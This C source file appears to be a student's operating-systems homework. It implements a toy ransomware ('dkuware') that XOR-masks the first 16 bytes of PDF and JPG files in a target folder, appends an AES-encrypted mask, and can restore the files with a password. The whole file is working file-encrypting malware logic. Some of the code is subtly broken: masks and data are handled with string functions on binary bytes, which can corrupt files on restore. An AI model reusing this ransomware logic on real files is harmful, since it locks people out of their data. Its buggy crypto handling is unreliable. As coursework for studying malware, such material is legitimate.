// 학번: 32184893
// 학과: 모바일시스템공학과
// 이름: 한현민

// 특이사항: 모든 기능 잘 작동하나, pdf_sample2는 공격했음에도 파일이 보임.
// 그러나, Hex Editor로 덤프 떠서 확인해보면
// 맨 앞 부분 16바이트 덮어쓰기 및 맨 뒷 부분 16바이트 마스크 쓰기 작업이
// 다른 파일들과 동일하게 잘 되어 있음.

// 빌드 방법
// .o 파일 및 실행 파일 (./dkuware) 생성: 터미널을 압축 해제한 디렉토리에 위치해
// 놓은 상태에서 make all 입력 .o 파일 및 실행 파일 (./dkuware) 제거: 터미널을
// 압축 해제한 디렉토리에 위치해 놓은 상태에서 make clean 입력

// 실행 방법 (password 인자는 비밀번호를 의미하며, 비밀번호는 password 이다.)
// - ./target 디렉토리 파일 암호화: 터미널을 압축 해제한 디렉토리에 위치해 놓은
// 상태에서 ./dkuware attack password 입력
// - ./target 디렉토리 파일 복호화: 터미널을 압축 해제한 디렉토리에 위치해 놓은
// 상태에서 ./dkuware restore password 입력

// 내가 놓친 부분들
// 1. 실행인자 중 "password" 에 대하여 (해결)
// - 기존에는 단순 비밀번호로 간주하고 입력 단에서 검증하고 넘어갔는데 이렇게
// 하면 안 됨
// - password에서 16바이트 추출 후 unsigned char 타입의 문자열로 저장
//  - 여기서, 입력받은 password가 16바이트보다 작다면 zero padding
// -> 즉, 같은 동작을 두 쓰레드가 하므로, unsigned char는 배열 형태의 전역변수로
// 저장하거나, 동적할당으로 저장하면 된다. 나머지는 똑같음

// 2. 복호화 작업
// 대충 암호화 시 넣은 키와 똑같은 키를 넣으면 되는듯

// heap corruption 문제
// 증상: 빌드 후에 첫 실행 시, 확률적으로 heap corruption 발생
// 원인 추측: 두 쓰레드가 같은 heap 영역을 동시에 참조하여 발생하는 오류. why?
// heap 영역은 두 쓰레드가 공유하는 영역이므로 해결책: 쓰레드 동기화 (mutex,
// semaphore 등등) -> but 수업에서 아직 나가지 않은 부분 다른 해결책: heap이
// 쓰이는 변수를 data segment에 할당하도록 변경

#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "crypto.h"
#include "utils.h"

// Maximum size of string buffer
#define BUF_SIZE 256
// Maximum amount of files from ./oshw2_sample/dkuware/target
#define MAX_FILE_AMOUNT 128
// Maximum length of each filename
#define DIR_LENGTH 256

// Key size
#define KEY_SIZE 16

// File handling block size
#define FILE_HANDLE_BLOCK_SIZE 16

// =========== handles file directory ===========
// For counting file count to be saved in directory string array
static int pdfFileCount = 0;
unsigned char pdfList[MAX_FILE_AMOUNT][DIR_LENGTH] = {
    {
        0,
    },
};

static int jpgFileCount = 0;
unsigned char jpgList[MAX_FILE_AMOUNT][DIR_LENGTH] = {
    {
        0,
    },
};

int inputValidate(int argc, char *argv[]);

void readFileList();

// =========== handles file encrpytion / decryption ===========
static __thread int processed_pdf_count = 0;
static __thread int processed_jpg_count = 0;

void *encryption_pdfs(void *key);

void *encryption_jpgs(void *key);

void *decryption_pdfs(void *key);

void *decryption_jpgs(void *key);

int main(int argc, char *argv[]) {
  if (!inputValidate(argc, argv)) {
    return -1;
  }

  char *fileHandleMode = argv[1];

  // save inputted password to key array as aes-key
  unsigned char key[KEY_SIZE] = {
      0,
  };
  if (strlen(argv[2]) < KEY_SIZE) {
    for (int i = 0; i < strlen(argv[2]); i++) {
      key[i] = (unsigned char)(argv[2][i]);
    }
  } else {
    for (int i = 0; i < KEY_SIZE; i++) {
      key[i] = (unsigned char)(argv[2][i]);
    }
  }

  readFileList();  // read all files in target directory and save their
                   // name into each string array "pdfList" and "jpgList"
                   // depending on its filetype

  // making threads and run them
  pthread_t pdfHandleThread;
  pthread_attr_t pdfHandleThreadStatus;
  pthread_attr_init(&pdfHandleThreadStatus);

  pthread_t jpgHandleThread;
  pthread_attr_t jpgHandleThreadStatus;
  pthread_attr_init(&jpgHandleThreadStatus);

  void (*f)(void *);  // specifying thread what to do

  if (strcmp(fileHandleMode, "attack") == 0) {
    f = encryption_pdfs;
    pthread_create(&pdfHandleThread, &pdfHandleThreadStatus, f, key);
    pthread_join(pdfHandleThread, NULL);

    f = encryption_jpgs;
    pthread_create(&jpgHandleThread, &jpgHandleThreadStatus, f, key);
    pthread_join(jpgHandleThread, NULL);

    printAsciiArtOnEncryption();

  } else if (strcmp(fileHandleMode, "restore") == 0) {
    f = decryption_pdfs;
    pthread_create(&pdfHandleThread, &pdfHandleThreadStatus, f, key);
    pthread_join(pdfHandleThread, NULL);

    f = decryption_jpgs;
    pthread_create(&jpgHandleThread, &jpgHandleThreadStatus, f, key);
    pthread_join(jpgHandleThread, NULL);

    printAsciiArtOnDecryption();
  }

  fflush(stdout);

  return 0;
}

int inputValidate(int argc, char *argv[]) {
  if (argc != 3) {
    printf("Error: Invalid Input\n");
    printf("Input example: <./filename> <attack/restore> <password>\n");
    return 0;
  }

  if (strcmp(argv[1], "attack") && strcmp(argv[1], "restore")) {
    printf("Error: Invalid Input\n");
    printf("Input example: <./filename> <attack/restore> <password>\n");
    return 0;
  }

  return 1;
}

void readFileList() {
  char command[BUF_SIZE] = "ls ./target";
  char fileItem[DIR_LENGTH] = {
      0,
  };

  char *fileTypeLower;  // .pdf, .jpg
  char *fileTypeUpper;  // .PDF, .JPG

  FILE *pipe = popen(command, "r");

  if (!pipe) {
    perror("Command execution error");
    return;
  } else {
    while (fscanf(pipe, "%s", fileItem) > 0) {
      // when fileCount exceeds maximum index of fileItem array, then
      // escape the loop statement.
      if (pdfFileCount >= MAX_FILE_AMOUNT || jpgFileCount >= MAX_FILE_AMOUNT) {
        break;
      }

      fileTypeLower = strstr(fileItem, ".pdf\0");
      if (fileTypeLower != NULL) {
        strcpy(pdfList[pdfFileCount++], fileItem);
        memset(fileItem, 0, BUF_SIZE);
        continue;
      }

      fileTypeUpper = strstr(fileItem, ".PDF\0");
      if (fileTypeUpper != NULL) {
        strcpy(pdfList[pdfFileCount++], fileItem);
        memset(fileItem, 0, BUF_SIZE);
        continue;
      }

      fileTypeLower = strstr(fileItem, ".jpg\0");
      if (fileTypeLower != NULL) {
        strcpy(jpgList[jpgFileCount++], fileItem);
      }

      fileTypeUpper = strstr(fileItem, ".JPG\0");
      if (fileTypeUpper != NULL) {
        strcpy(jpgList[jpgFileCount++], fileItem);
      }

      memset(fileItem, 0, BUF_SIZE);
    }
  }

  pclose(pipe);
}

void *encryption_pdfs(void *key) {
  for (int i = 0; i < pdfFileCount; i++) {
    // open a single jpg file
    unsigned char *fileDir =
        (unsigned char *)malloc(sizeof(unsigned char) * BUF_SIZE);
    strcpy(fileDir, "./target/");
    strcat(fileDir, pdfList[i]);
    FILE *fp = fopen(fileDir, "rb");

    // print message on terminal
    printf("[attack] %s\n", fileDir);

    // read browsed file by 16 bytes
    unsigned char *plainText =
        (unsigned char *)malloc(sizeof(unsigned char) * FILE_HANDLE_BLOCK_SIZE);
    memset(plainText, 0, FILE_HANDLE_BLOCK_SIZE);

    // get size value
    int plainTextSize = fread(plainText, 1, FILE_HANDLE_BLOCK_SIZE, fp);
    int plainTextStringSize = strlen(plainText);

    // check plainText size is 16 or not.
    // if the size is less than 16, then give it zero padding.
    if (plainTextStringSize == FILE_HANDLE_BLOCK_SIZE) {
    } else if (plainTextStringSize >= 0) {
      // give plainText zero padding
      for (int i = 0; i < FILE_HANDLE_BLOCK_SIZE - plainTextStringSize; i++) {
        strcat(plainText, "0");
      }
    } else {
      perror("File read failure");  // exception
    }

    // generate mask randomly
    unsigned char *mask =
        (unsigned char *)malloc(sizeof(unsigned char) * FILE_HANDLE_BLOCK_SIZE);
    memset(mask, 0, FILE_HANDLE_BLOCK_SIZE);
    unsigned char segment[2] = {
        0,
    };
    for (int i = 0; i < FILE_HANDLE_BLOCK_SIZE; i++) {
      segment[0] = (unsigned char)rand();
      strcat(mask, segment);
      memset(segment, 0, 2);
    }

    // do XOR calculation on plainText with randomly generated mask
    unsigned char cipherText[FILE_HANDLE_BLOCK_SIZE] = {
        0,
    };
    for (int i = 0; i < FILE_HANDLE_BLOCK_SIZE; i++) {
      cipherText[i] = plainText[i] ^ mask[i];
    }

    // overwrite cipherText on the head of target file
    FILE *overwrite_fp = fopen(fileDir, "r+b");
    fwrite(cipherText, 1, 16, overwrite_fp);  // write cipherText on target
    fclose(overwrite_fp);

    // mask를 AES-128 알고리즘으로 암호화
    mask = aes_128_encryption(mask, key);

    // overwrite encrypted mask on the tail of target file
    overwrite_fp = fopen(fileDir, "ab");
    fwrite(mask, 1, 16, overwrite_fp);  // write encrypted mask on target
    fclose(overwrite_fp);

    free(mask);
    free(plainText);
    fclose(fp);
    free(fileDir);

    processed_pdf_count++;
  }

  // print message on terminal
  printf("[attack] %d pdf files were encrypted\n", processed_pdf_count);

  return NULL;
}

void *encryption_jpgs(void *key) {
  for (int i = 0; i < jpgFileCount; i++) {
    // open a single jpg file
    unsigned char *fileDir =
        (unsigned char *)malloc(sizeof(unsigned char) * BUF_SIZE);
    strcpy(fileDir, "./target/");
    strcat(fileDir, jpgList[i]);
    FILE *fp = fopen(fileDir, "rb");

    // print message on terminal
    printf("[attack] %s\n", fileDir);

    // read browsed file by 16 bytes
    unsigned char *plainText =
        (unsigned char *)malloc(sizeof(unsigned char) * FILE_HANDLE_BLOCK_SIZE);
    memset(plainText, 0, FILE_HANDLE_BLOCK_SIZE);

    // get size value
    int plainTextSize = fread(plainText, 1, FILE_HANDLE_BLOCK_SIZE, fp);
    int plainTextStringSize = strlen(plainText);

    // check plainText size is 16 or not.
    // if the size is less than 16, then give it zero padding.
    if (plainTextStringSize == FILE_HANDLE_BLOCK_SIZE) {
    } else if (plainTextStringSize >= 0) {
      // give plainText zero padding
      for (int i = 0; i < FILE_HANDLE_BLOCK_SIZE - plainTextStringSize; i++) {
        strcat(plainText, "0");
      }
    } else {
      perror("File read failure");  // exception
    }

    // generate mask randomly
    unsigned char *mask =
        (unsigned char *)malloc(sizeof(unsigned char) * FILE_HANDLE_BLOCK_SIZE);
    memset(mask, 0, FILE_HANDLE_BLOCK_SIZE);
    unsigned char segment[2] = {
        0,
    };
    for (int i = 0; i < FILE_HANDLE_BLOCK_SIZE; i++) {
      segment[0] = (unsigned char)rand();
      strcat(mask, segment);
      memset(segment, 0, 2);
    }

    // do XOR calculation on plainText with randomly generated mask
    unsigned char cipherText[FILE_HANDLE_BLOCK_SIZE] = {
        0,
    };
    for (int i = 0; i < FILE_HANDLE_BLOCK_SIZE; i++) {
      cipherText[i] = plainText[i] ^ mask[i];
    }

    // overwrite cipherText on the head of target file
    FILE *overwrite_fp = fopen(fileDir, "r+b");
    fwrite(cipherText, 1, 16, overwrite_fp);  // write cipherText on target
    fclose(overwrite_fp);

    // mask를 AES-128 알고리즘으로 암호화
    mask = aes_128_encryption(mask, key);

    // overwrite encrypted mask on the tail of target file
    overwrite_fp = fopen(fileDir, "ab");
    fwrite(mask, 1, 16, overwrite_fp);  // write encrypted mask on target
    fclose(overwrite_fp);

    free(mask);
    free(plainText);
    fclose(fp);
    free(fileDir);

    processed_jpg_count++;
  }

  // print message on terminal
  printf("[attack] %d jpg files were encrypted\n", processed_jpg_count);

  return NULL;
}

void *decryption_pdfs(void *key) {
  for (int i = 0; i < pdfFileCount; i++) {
    // open a single jpg file
    unsigned char *fileDir =
        (unsigned char *)malloc(sizeof(unsigned char) * BUF_SIZE);
    strcpy(fileDir, "./target/");
    strcat(fileDir, pdfList[i]);
    FILE *payload_fp = fopen(fileDir, "rb");
    FILE *mask_fp = fopen(fileDir, "rb");
    fseek(mask_fp, -FILE_HANDLE_BLOCK_SIZE, SEEK_END);

    // print message on terminal
    printf("[restore] %s\n", fileDir);

    // read browsed file by 16 bytes
    unsigned char *cipherText =
        (unsigned char *)malloc(sizeof(unsigned char) * FILE_HANDLE_BLOCK_SIZE);
    memset(cipherText, 0, FILE_HANDLE_BLOCK_SIZE);
    // get size value
    int cipherTextSize =
        fread(cipherText, 1, FILE_HANDLE_BLOCK_SIZE, payload_fp);
    int cipherTextStringSize = strlen(cipherText);

    // read browsed file by 16 bytes
    unsigned char *mask =
        (unsigned char *)malloc(sizeof(unsigned char) * FILE_HANDLE_BLOCK_SIZE);
    memset(mask, 0, FILE_HANDLE_BLOCK_SIZE);
    // get size value
    int maskSize = fread(mask, 1, FILE_HANDLE_BLOCK_SIZE, mask_fp);
    int maskTextStringSize = strlen(mask);

    mask = aes_128_decryption(mask, key);

    // do XOR calculation on plainText with randomly generated mask
    unsigned char plainText[FILE_HANDLE_BLOCK_SIZE] = {
        0,
    };
    for (int i = 0; i < FILE_HANDLE_BLOCK_SIZE; i++) {
      plainText[i] = cipherText[i] ^ mask[i];
    }

    // write plainText in the head of file
    fclose(payload_fp);
    payload_fp = fopen(fileDir, "r+b");
    fwrite(plainText, 1, FILE_HANDLE_BLOCK_SIZE, payload_fp);

    // erase mask in the tail of file
    fclose(mask_fp);
    mask_fp = fopen(fileDir, "r+b");
    fseek(mask_fp, -FILE_HANDLE_BLOCK_SIZE, SEEK_END);
    char eraser[1] = {'\0'};
    for (int i = 0; i < FILE_HANDLE_BLOCK_SIZE; i++) {
      fwrite(eraser, 1, 1, mask_fp);  // overwrite null character in 16 times
    }

    free(mask);
    free(cipherText);
    fclose(mask_fp);
    fclose(payload_fp);
    free(fileDir);

    processed_pdf_count++;
  }

  // print message on terminal
  printf("[restore] %d pdf files were decrypted\n", processed_pdf_count);

  return NULL;
}

void *decryption_jpgs(void *key) {
  for (int i = 0; i < jpgFileCount; i++) {
    // open a single jpg file
    unsigned char *fileDir =
        (unsigned char *)malloc(sizeof(unsigned char) * BUF_SIZE);
    strcpy(fileDir, "./target/");
    strcat(fileDir, jpgList[i]);
    FILE *payload_fp = fopen(fileDir, "rb");
    FILE *mask_fp = fopen(fileDir, "rb");
    fseek(mask_fp, -FILE_HANDLE_BLOCK_SIZE, SEEK_END);

    // print message on terminal
    printf("[restore] %s\n", fileDir);

    // read browsed file by 16 bytes
    unsigned char *cipherText =
        (unsigned char *)malloc(sizeof(unsigned char) * FILE_HANDLE_BLOCK_SIZE);
    memset(cipherText, 0, FILE_HANDLE_BLOCK_SIZE);
    // get size value
    int cipherTextSize =
        fread(cipherText, 1, FILE_HANDLE_BLOCK_SIZE, payload_fp);
    int cipherTextStringSize = strlen(cipherText);

    // read browsed file by 16 bytes
    unsigned char *mask =
        (unsigned char *)malloc(sizeof(unsigned char) * FILE_HANDLE_BLOCK_SIZE);
    memset(mask, 0, FILE_HANDLE_BLOCK_SIZE);
    // get size value
    int maskSize = fread(mask, 1, FILE_HANDLE_BLOCK_SIZE, mask_fp);
    int maskTextStringSize = strlen(mask);

    mask = aes_128_decryption(mask, key);

    // do XOR calculation on plainText with randomly generated mask
    unsigned char plainText[FILE_HANDLE_BLOCK_SIZE] = {
        0,
    };
    for (int i = 0; i < FILE_HANDLE_BLOCK_SIZE; i++) {
      plainText[i] = cipherText[i] ^ mask[i];
    }

    // write plainText in the head of file
    fclose(payload_fp);
    payload_fp = fopen(fileDir, "r+b");
    fwrite(plainText, 1, FILE_HANDLE_BLOCK_SIZE, payload_fp);

    // erase mask in the tail of file
    fclose(mask_fp);
    mask_fp = fopen(fileDir, "r+b");
    fseek(mask_fp, -FILE_HANDLE_BLOCK_SIZE, SEEK_END);
    char eraser[1] = {'\0'};
    for (int i = 0; i < FILE_HANDLE_BLOCK_SIZE; i++) {
      fwrite(eraser, 1, 1, mask_fp);  // overwrite null character in 16 times
    }

    free(mask);
    free(cipherText);
    fclose(mask_fp);
    fclose(payload_fp);
    free(fileDir);

    processed_jpg_count++;
  }

  // print message on terminal
  printf("[restore] %d jpg files were decrypted\n", processed_jpg_count);

  return NULL;
}